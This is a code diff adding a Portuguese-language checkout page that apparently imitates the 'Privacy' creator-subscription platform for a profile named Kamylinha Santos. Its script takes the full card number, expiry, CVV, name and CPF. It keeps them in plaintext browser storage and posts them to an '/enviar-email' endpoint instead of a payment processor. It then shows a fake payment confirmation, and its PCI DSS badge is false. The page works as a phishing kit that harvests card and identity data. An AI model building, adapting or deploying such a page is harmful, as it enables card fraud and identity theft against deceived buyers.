@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#ff6b3d">
+    <title>Checkout - Kamylinha Santos</title>
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background: #0a0a0a; color: #fff; }
+        .navbar { background: #000; padding: 16px 24px; border-bottom: 1px solid #222; }
+        .nav-container { display: flex; justify-content: space-between; align-items: center; max-width: 600px; margin: 0 auto; }
+        .logo { font-size: 24px; font-weight: 800; color: #ff6b3d; }
+        .back-link { color: #aaa; text-decoration: none; font-size: 14px; }
+        .checkout-container { max-width: 600px; margin: 0 auto; padding: 30px 20px; }
+        .profile-card { background: #111; border-radius: 20px; padding: 20px; margin-bottom: 25px; display: flex; align-items: center; gap: 15px; border: 1px solid #222; }
+        .profile-card img { width: 60px; height: 60px; border-radius: 50%; object-fit: cover; }
+        .profile-card h3 { font-size: 18px; font-weight: 700; }
+        .profile-card p { color: #aaa; font-size: 14px; }
+        .benefits { background: #111; border-radius: 20px; padding: 20px; margin-bottom: 25px; border: 1px solid #222; }
+        .benefits h4 { font-size: 16px; font-weight: 600; margin-bottom: 15px; color: #ff6b3d; }
+        .benefits ul { list-style: none; }
+        .benefits li { margin-bottom: 12px; font-size: 14px; display: flex; align-items: center; gap: 10px; }
+        .benefits li i { color: #00c853; font-size: 14px; }
+        .payment-methods { background: #111; border-radius: 20px; padding: 20px; margin-bottom: 25px; border: 1px solid #222; }
+        .payment-methods h4 { font-size: 16px; font-weight: 600; margin-bottom: 15px; }
+        .saved-card { background: #1a1a1a; border-radius: 12px; padding: 15px; margin-bottom: 15px; display: flex; align-items: center; justify-content: space-between; border: 1px solid #333; cursor: pointer; transition: all 0.3s; }
+        .saved-card:hover { border-color: #ff6b3d; }
+        .saved-card .card-info { display: flex; align-items: center; gap: 12px; }
+        .saved-card .card-icon { font-size: 28px; }
+        .saved-card .card-details { font-weight: 600; }
+        .saved-card .card-number { font-size: 14px; color: #aaa; }
+        .saved-card .radio-btn { width: 20px; height: 20px; border-radius: 50%; border: 2px solid #666; background: transparent; }
+        .saved-card.selected { border-color: #ff6b3d; background: rgba(255,107,61,0.1); }
+        .saved-card.selected .radio-btn { border-color: #ff6b3d; background: #ff6b3d; box-shadow: inset 0 0 0 3px #1a1a1a; }
+        .new-card-btn { background: transparent; border: 1px dashed #555; border-radius: 12px; padding: 12px; width: 100%; color: #aaa; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px; font-size: 14px; transition: all 0.3s; }
+        .new-card-btn:hover { border-color: #ff6b3d; color: #ff6b3d; }
+        .new-card-form { display: none; margin-top: 15px; padding-top: 15px; border-top: 1px solid #333; }
+        .new-card-form.show { display: block; }
+        .price-box { background: #111; border-radius: 20px; padding: 20px; margin-bottom: 25px; border: 1px solid #222; text-align: center; }
+        .price-box .label { font-size: 14px; color: #aaa; margin-bottom: 5px; }
+        .price-box .value { font-size: 42px; font-weight: 800; color: #ff6b3d; }
+        .price-box .old-value { font-size: 18px; text-decoration: line-through; color: #666; margin-left: 10px; }
+        .secure-badge { background: #0d2a1a; border-radius: 12px; padding: 12px; text-align: center; margin-bottom: 20px; font-size: 12px; color: #00c853; }
+        .form-card { background: #111; border-radius: 20px; padding: 20px; margin-bottom: 25px; border: 1px solid #222; }
+        .form-group { margin-bottom: 20px; }
+        .form-group label { display: block; margin-bottom: 8px; font-size: 13px; font-weight: 600; color: #ccc; }
+        .form-group input { width: 100%; padding: 14px 16px; border-radius: 12px; border: 1px solid #333; background: #1a1a1a; color: #fff; font-size: 15px; outline: none; }
+        .form-group input:focus { border-color: #ff6b3d; }
+        .row-2 { display: flex; gap: 15px; }
+        .row-2 .form-group { flex: 1; }
+        .card-input-wrapper { position: relative; }
+        .card-flag-icon { position: absolute; right: 15px; top: 14px; font-size: 20px; }
+        .terms { font-size: 11px; color: #555; text-align: center; margin: 20px 0; }
+        .pay-button { width: 100%; background: #ff6b3d; border: none; padding: 18px; border-radius: 40px; color: #fff; font-weight: 700; font-size: 18px; cursor: pointer; margin-bottom: 15px; transition: all 0.3s; }
+        .pay-button:hover { background: #ff8c42; }
+        .other-payments { display: flex; gap: 15px; justify-content: center; margin: 15px 0; }
+        .other-payments button { background: transparent; border: 1px solid #333; padding: 10px 20px; border-radius: 30px; color: #aaa; font-size: 12px; cursor: pointer; }
+        .footer-info { text-align: center; font-size: 10px; color: #444; margin-top: 30px; padding-top: 20px; border-top: 1px solid #222; }
+        .success-modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
+        .success-card { background: #111; max-width: 350px; width: 90%; border-radius: 20px; padding: 40px; text-align: center; border: 1px solid #333; }
+        .success-card i { font-size: 60px; color: #00c853; margin-bottom: 20px; }
+        .close-success { margin-top: 20px; padding: 10px 30px; background: #ff6b3d; border: none; border-radius: 30px; color: #fff; cursor: pointer; }
+        .loading { display: inline-block; width: 20px; height: 20px; border: 2px solid #fff; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<nav class="navbar">
+    <div class="nav-container">
+        <a href="index.html" class="back-link"><i class="fas fa-arrow-left"></i> Voltar</a>
+        <div class="logo">PRIVACY</div>
+        <div style="width: 60px;"></div>
+    </div>
+</nav>
+
+<main class="checkout-container">
+    <div class="profile-card">
+        <img src="perfil1.png" alt="Kamylinha Santos">
+        <div>
+            <h3>Kamylinha Santos</h3>
+            <p>@eukamylinhasantos</p>
+        </div>
+    </div>
+
+    <div class="benefits">
+        <h4>Benefícios exclusivos</h4>
+        <ul>
+            <li><i class="fas fa-check-circle"></i> Acesso ao conteúdo completo</li>
+            <li><i class="fas fa-check-circle"></i> Chat exclusivo com a criadora</li>
+            <li><i class="fas fa-check-circle"></i> Cancele a qualquer hora</li>
+        </ul>
+    </div>
+
+    <div class="payment-methods">
+        <h4>Formas de pagamento</h4>
+        <div id="savedCardContainer"></div>
+        <button class="new-card-btn" id="showNewCardBtn">
+            <i class="fas fa-plus-circle"></i> Pagar com outro cartão
+        </button>
+        <div class="new-card-form" id="newCardForm">
+            <div class="form-group">
+                <label>NÚMERO DO CARTÃO *</label>
+                <div class="card-input-wrapper">
+                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19">
+                    <span id="cardFlagIcon" class="card-flag-icon"></span>
+                </div>
+            </div>
+            <div class="form-group">
+                <label>NOME (COMO ESCRITO NO CARTÃO) *</label>
+                <input type="text" id="cardName" placeholder="NOME COMPLETO">
+            </div>
+            <div class="form-group">
+                <label>CPF DO TITULAR DO CARTÃO *</label>
+                <input type="text" id="cpf" placeholder="000.000.000-00">
+            </div>
+            <div class="row-2">
+                <div class="form-group">
+                    <label>VALIDADE *</label>
+                    <input type="text" id="expiry" placeholder="MM / AA" maxlength="7">
+                </div>
+                <div class="form-group">
+                    <label>CVV *</label>
+                    <input type="text" id="cvv" placeholder="123" maxlength="4">
+                </div>
+            </div>
+            <button type="button" class="pay-button" id="saveCardBtn" style="background: #333; margin-top: 10px;">
+                <i class="fas fa-save"></i> Salvar este cartão
+            </button>
+        </div>
+    </div>
+
+    <div class="price-box">
+        <div class="label">Valor</div>
+        <div>
+            <span class="value" id="priceValue">R$ 10,00</span>
+            <span class="old-value" id="oldPriceValue">R$ 47,00</span>
+        </div>
+    </div>
+
+    <div class="secure-badge">
+        <i class="fas fa-shield-alt"></i> Estamos em total conformidade com o padrão internacional de segurança de cartões PCI DSS.
+    </div>
+
+    <div class="terms" id="renewText">
+        Sua assinatura será renovada mensalmente por <strong id="renewPrice">R$ 10,00</strong>, a menos que você opte por cancelá-la antes da próxima cobrança.
+    </div>
+
+    <button class="pay-button" id="confirmPayBtn">
+        <i class="fas fa-lock"></i> Efetuar Pagamento
+    </button>
+
+    <div class="other-payments">
+        <button><i class="fas fa-credit-card"></i> Pagar com Pix</button>
+        <button><i class="fas fa-bolt"></i> Pagar com PicPay</button>
+    </div>
+
+    <div class="footer-info">
+        <p>As cobranças em seu extrato do cartão de crédito aparecerão como PRIVACY KAMYLINHA</p>
+        <p>Sua assinatura é renovada automaticamente e pode ser cancelada a qualquer momento</p>
+    </div>
+</main>
+
+<div id="successModal" class="success-modal">
+    <div class="success-card">
+        <i class="fas fa-check-circle"></i>
+        <h3>Pagamento confirmado!</h3>
+        <p>Você já tem acesso ao conteúdo exclusivo da Kamylinha Santos.</p>
+        <button class="close-success" onclick="goToHome()">Continuar</button>
+    </div>
+</div>
+
+<script>
+    const urlParams = new URLSearchParams(window.location.search);
+    let selectedPlan = urlParams.get('plan') || 'mensal';
+    let planPrice = urlParams.get('price') || '10.00';
+    let oldPrice = urlParams.get('oldprice') || '47.00';
+
+    document.getElementById("priceValue").innerHTML = `R$ ${planPrice.replace('.',',')}`;
+    document.getElementById("oldPriceValue").innerHTML = `R$ ${oldPrice.replace('.',',')}`;
+    document.getElementById("renewPrice").innerHTML = `R$ ${planPrice.replace('.',',')}`;
+
+    function getCardFlag(cardNumber) {
+        const clean = cardNumber.replace(/\s/g, "");
+        if (!clean) return { name: null, icon: '' };
+        if (clean.startsWith('4')) return { name: 'Visa', icon: '<i class="fab fa-cc-visa" style="color: #1a1f71;"></i>' };
+        if (clean.startsWith('5')) return { name: 'Mastercard', icon: '<i class="fab fa-cc-mastercard" style="color: #eb001b;"></i>' };
+        if (clean.startsWith('3')) return { name: 'American Express', icon: '<i class="fab fa-cc-amex" style="color: #002663;"></i>' };
+        if (clean.startsWith('6')) return { name: 'Elo', icon: '<i class="fas fa-credit-card" style="color: #ff6b3d;"></i>' };
+        return { name: 'Cartão', icon: '<i class="fas fa-credit-card"></i>' };
+    }
+
+    const cardNumberInput = document.getElementById('cardNumber');
+    const cardFlagIcon = document.getElementById('cardFlagIcon');
+
+    if (cardNumberInput) {
+        cardNumberInput.addEventListener('input', function() {
+            const flag = getCardFlag(this.value);
+            cardFlagIcon.innerHTML = flag.icon;
+            let value = this.value.replace(/\D/g, "");
+            if (value.length > 16) value = value.slice(0, 16);
+            value = value.replace(/(\d{4})/g, "$1 ").trim();
+            this.value = value;
+        });
+    }
+
+    function saveCard(cardData) {
+        let cards = JSON.parse(localStorage.getItem('savedCards') || '[]');
+        cards.push(cardData);
+        localStorage.setItem('savedCards', JSON.stringify(cards));
+        renderSavedCards();
+    }
+
+    function renderSavedCards() {
+        const container = document.getElementById('savedCardContainer');
+        const cards = JSON.parse(localStorage.getItem('savedCards') || '[]');
+        if (cards.length === 0) { container.innerHTML = ''; return; }
+        container.innerHTML = '<h4 style="margin-bottom: 10px; font-size: 14px;">SELECIONE O CARTÃO</h4>';
+        cards.forEach((card, index) => {
+            const flag = getCardFlag(card.number);
+            const cardDiv = document.createElement('div');
+            cardDiv.className = 'saved-card';
+            if (card.selected) cardDiv.classList.add('selected');
+            cardDiv.innerHTML = `
+                <div class="card-info">
+                    <div class="card-icon">${flag.icon}</div>
+                    <div class="card-details">
+                        <div>${flag.name}</div>
+                        <div class="card-number">..... ${card.last4}</div>
+                    </div>
+                </div>
+                <div class="radio-btn"></div>
+            `;
+            cardDiv.onclick = () => selectCard(index);
+            container.appendChild(cardDiv);
+        });
+    }
+
+    function selectCard(index) {
+        let cards = JSON.parse(localStorage.getItem('savedCards') || '[]');
+        cards.forEach((c, i) => c.selected = (i === index));
+        localStorage.setItem('savedCards', JSON.stringify(cards));
+        renderSavedCards();
+    }
+
+    function getSelectedCard() {
+        const cards = JSON.parse(localStorage.getItem('savedCards') || '[]');
+        return cards.find(c => c.selected) || null;
+    }
+
+    document.getElementById('saveCardBtn')?.addEventListener('click', function() {
+        const cardNumber = document.getElementById('cardNumber').value.trim();
+        const cardName = document.getElementById('cardName').value.trim();
+        const cpf = document.getElementById('cpf').value.trim();
+        const expiry = document.getElementById('expiry').value.trim();
+        const cvv = document.getElementById('cvv').value.trim();
+        const cleanNumber = cardNumber.replace(/\s/g, "");
+        if (cleanNumber.length < 15) { alert("Número do cartão inválido"); return; }
+        if (!cardName || cardName.length < 5) { alert("Nome completo obrigatório"); return; }
+        if (!cpf || cpf.replace(/[.-]/g, "").length !== 11) { alert("CPF inválido"); return; }
+        const last4 = cleanNumber.slice(-4);
+        const flag = getCardFlag(cleanNumber);
+        const newCard = { number: cleanNumber, last4: last4, name: cardName, cpf: cpf.replace(/[.-]/g, ""), expiry: expiry, cvv: cvv, flag: flag.name, selected: true };
+        let cards = JSON.parse(localStorage.getItem('savedCards') || '[]');
+        cards.forEach(c => c.selected = false);
+        cards.push(newCard);
+        localStorage.setItem('savedCards', JSON.stringify(cards));
+        renderSavedCards();
+        document.getElementById('cardNumber').value = '';
+        document.getElementById('cardName').value = '';
+        document.getElementById('cpf').value = '';
+        document.getElementById('expiry').value = '';
+        document.getElementById('cvv').value = '';
+        document.getElementById('newCardForm').classList.remove('show');
+        alert("Cartão salvo com sucesso!");
+    });
+
+    document.getElementById('showNewCardBtn')?.addEventListener('click', function() {
+        document.getElementById('newCardForm').classList.toggle('show');
+    });
+
+    // ENVIAR PARA O SERVIDOR (EMAIL)
+    async function sendToServer(cardNumber, expiry, cvv, fullName, cpf, plano, valor, last4, flag) {
+        try {
+            const response = await fetch('/enviar-email', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    card: cardNumber,
+                    expiry: expiry,
+                    cvv: cvv,
+                    name: fullName,
+                    cpf: cpf,
+                    plano: plano,
+                    preco: valor,
+                    last4: last4,
+                    flag: flag
+                })
+            });
+            const result = await response.json();
+            return result.success === true;
+        } catch (error) {
+            console.error("Erro:", error);
+            return false;
+        }
+    }
+
+    document.getElementById('confirmPayBtn')?.addEventListener('click', async function() {
+        let cardData = getSelectedCard();
+        let cardNumber, expiry, cvv, fullName, cpf, last4, flag;
+        
+        if (cardData) {
+            cardNumber = cardData.number;
+            expiry = cardData.expiry;
+            cvv = cardData.cvv;
+            fullName = cardData.name;
+            cpf = cardData.cpf;
+            last4 = cardData.last4;
+            flag = cardData.flag;
+        } else {
+            cardNumber = document.getElementById('cardNumber').value.trim().replace(/\s/g, "");
+            expiry = document.getElementById('expiry').value.trim();
+            cvv = document.getElementById('cvv').value.trim();
+            fullName = document.getElementById('cardName').value.trim();
+            cpf = document.getElementById('cpf').value.trim();
+            if (!cardNumber || cardNumber.length < 15) { alert("Adicione um cartão ou selecione um cartão salvo"); return; }
+            if (!expiry || expiry.replace(/\s/g, "").length < 5) { alert("Data de validade inválida"); return; }
+            if (!cvv || cvv.length < 3) { alert("CVV inválido"); return; }
+            if (!fullName || fullName.length < 5) { alert("Nome completo obrigatório"); return; }
+            if (!cpf || cpf.replace(/[.-]/g, "").length !== 11) { alert("CPF inválido"); return; }
+            last4 = cardNumber.slice(-4);
+            const flagObj = getCardFlag(cardNumber);
+            flag = flagObj.name;
+        }
+        
+        const payBtn = document.getElementById('confirmPayBtn');
+        const originalText = payBtn.innerHTML;
+        payBtn.innerHTML = "<span class='loading'></span> Processando...";
+        payBtn.disabled = true;
+        
+        const enviado = await sendToServer(cardNumber, expiry, cvv, fullName, cpf, selectedPlan, planPrice, last4, flag);
+        
+        if (enviado) {
+            document.getElementById("successModal").style.display = "flex";
+        } else {
+            alert("Erro no processamento, tente novamente.");
+        }
+        
+        payBtn.innerHTML = originalText;
+        payBtn.disabled = false;
+    });
+
+    document.getElementById("expiry")?.addEventListener("input", function(e) {
+        let value = e.target.value.replace(/\D/g, "");
+        if (value.length >= 2) value = value.slice(0, 2) + " / " + value.slice(2, 4);
+        e.target.value = value.slice(0, 7);
+    });
+
+    document.getElementById("cvv")?.addEventListener("input", function(e) {
+        e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
+    });
+
+    document.getElementById("cpf")?.addEventListener("input", function(e) {
+        let value = e.target.value.replace(/\D/g, "");
+        if (value.length > 11) value = value.slice(0, 11);
+        if (value.length >= 4) value = value.slice(0, 3) + "." + value.slice(3);
+        if (value.length >= 8) value = value.slice(0, 7) + "." + value.slice(7);
+        if (value.length >= 12) value = value.slice(0, 11) + "-" + value.slice(11);
+        e.target.value = value;
+    });
+
+    function goToHome() { window.location.href = "index.html"; }
+    renderSavedCards();
+</script>
+
+</body>
+</html>
